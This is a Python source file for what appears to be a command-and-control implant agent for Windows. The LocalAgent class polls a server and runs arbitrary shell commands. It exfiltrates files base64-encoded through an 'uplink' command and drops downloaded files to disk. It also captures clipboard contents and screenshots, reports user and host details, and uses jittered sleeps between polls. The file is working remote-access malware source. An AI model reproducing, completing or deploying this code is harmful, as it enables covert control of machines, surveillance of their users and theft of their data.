import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random

import pyautogui
from io import BytesIO
from PIL import Image


import win32clipboard

#TODO Subclass for DNS

class LocalAgent:
	def buildCatContent(self):
		continueBuilding = True
		content = ""
		while continueBuilding:
			command = self.pollCommand()
			if command == None:
				sleep_int = 1 + (random.randint(1,500) / 1000)
				time.sleep(sleep_int)
			elif command == '<done>':
				continueBuilding = False
			elif command == '<cancel>':
				return ""
			else:
				#Why write a \n character instead of os.linesep? b/c python
                #tried to be helpful and autocorrects your os.linesep to \r\r\n on
                #windows when writing a text file. So helpful...
				content = content + command + '\n'
		return content

	def readFile(self, filename, lineNums):
		try:
			file = open(filename, 'r')
			lines = file.readlines()
			count = 0
			content = ""
			for line in lines:
				count += 1
				if lineNums:
					content = content + str(count) + ": "
				content = content + line + "\n"
			self.postResponse(content)
			file.close()
		except:
			self.postResponse("Invalid cat directive")

	def postHarvest(self, cmd_output, harvestType):
		raise NotImplementedError("Please Implement this method")
        
	def postScreenshot(self, cmd_output):
		raise NotImplementedError("Please Implement this method")

	def postResponse(self, cmd_output):
		raise NotImplementedError("Please Implement this method")
	
	def pollServer(self):
		raise NotImplementedError("Please Implement this method") 
    
	def pollCommand(self):
		response = self.pollServer()
		if response == '<control> No Command':
			return None
		elif response.startswith("<control> download "):
			#hexString = response[len("<control> download "):]
			#binary = base64.decodebytes(hexString.encode('ascii'))
			#f = open(".\\received", 'wb+')
			#f.write(binary)
			#f.close()
			ctrl, cmd, localname, data = response.split(" ")
			binary = base64.decodebytes(data.encode('ascii'))
			f = open(".\\" + localname, 'wb+')
			f.write(binary)
			f.close()
			self.postResponse("File written: " + localname)
			return None
		elif response.startswith("uplink "):
			filename = response[len("uplink "):]
			try:
				file = open(filename, 'rb')
				file_read = file.read() 
				file.close()
				self.postResponse("<control> uplinked " + os.path.basename(file.name) + " " + base64.encodebytes(file_read).decode('ascii').replace("\n", ""))
			except:
				self.postResponse("Invalid uplink directive")
			return None
		elif response.startswith("getuid"):
			username = getpass.getuser()
			homedir = str(Path.home())
			hostname = socket.gethostname()
			response_str = "Username: " + username + "\n"
			response_str = response_str + "Home Directory: " + homedir + "\n"
			response_str = response_str + "Hostname: " + hostname + "\n"
			self.postResponse(response_str)
			return None
		elif response.startswith("ps"):
			return "tasklist"
		elif response.startswith("cd "):
			relative = response[len("cd "):]
			try:
				os.chdir(os.path.join(os.path.abspath(os.getcwd()), relative))
			except:
				self.postResponse("Invalid directory traversal")
			self.postResponse(os.getcwd())
			return None
		elif response == 'pwd':
			self.postResponse(os.getcwd())
			return None
		elif response == 'die':
			raise Exception('time to die')
		elif response == 'clipboard':
			try:
				win32clipboard.OpenClipboard()
				data = win32clipboard.GetClipboardData()
				win32clipboard.CloseClipboard()
				self.postHarvest(data, "Clipboard")
				self.postResponse("Clipboard captured")
			except Exception as e:
				print("Oops, something went wrong: {}".format(e), file=sys.stderr)
			return None
		elif response == 'screenshot':
			try:
				image = pyautogui.screenshot()
				im_file = BytesIO()
				image.save(im_file, format="JPEG")
				im_bytes = im_file.getvalue()  # im_bytes: image in binary format.
				im_b64 = base64.b64encode(im_bytes).decode('ascii')
				self.postScreenshot(im_b64)
				self.postResponse("Screenshot successful")
			except Exception as e:
				print("Oops, something went wrong: {}".format(e), file=sys.stderr)            
			return None
		elif response.startswith('cat'):            
			elements = response.split(" ")  
			if len(elements) == 2:
				if elements[1].startswith('>>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">>"):], 'a') as f:
							f.write(newContent)          
						self.postResponse("Data written")    
					else:
						self.postResponse("Abort: No file write")
				elif elements[1].startswith('>'):
					newContent = self.buildCatContent()
					if newContent != '':
						with open(elements[1][len(">"):], 'w') as f:
							f.write(newContent)
						self.postResponse("Data written")
					else:
						self.postResponse("Abort: No file write")                        
				else:               
					self.readFile(elements[1], False)
			elif len(elements) == 3:
				if elements[1] != '-n':
					self.postResponse("No valid cat interpretation")            
				self.readFile(elements[2], True)
			elif len(elements) == 4:
				if elements[2] == '>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						f = open(elements[3], 'wb')
						f.write(file_read)
						f.close()
						self.postResponse("File write executed")                            
					except:
						self.postResponse("Invalid cat directive")                
				elif elements[2] == '>>':
					try:
						file = open(elements[1], 'rb')
						file_read = file.read() 
						file.close()
						with open(elements[3], 'ab') as f:
							f.write(file_read)
						self.postResponse("Appended file")
					except Exception as e:
						#print("Oops, something went wrong: {}".format(e), file=sys.stderr)
						self.postResponse("Invalid cat directive")                
				else:
					self.postResponse("No valid cat interpretation")                
			else:
				self.postResponse("No valid cat interpretation")            
			return None                
		else:
			return response

	def run(self, newLineAfterCmdOutput = False):
		self.newLineAfterCmdOutput = newLineAfterCmdOutput
		live = True
		while(live):
			try:
				command = self.pollCommand()
				if command != None:
					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
					if self.newLineAfterCmdOutput:
						cmd_output = cmd_output + "\n"
					self.postResponse(cmd_output)
				else:
					sleep_int = 1 + (random.randint(1,500) / 1000)
					time.sleep(sleep_int)
			except Exception as e:
				live = False
				print("Shutting down {}".format(e), file=sys.stderr)
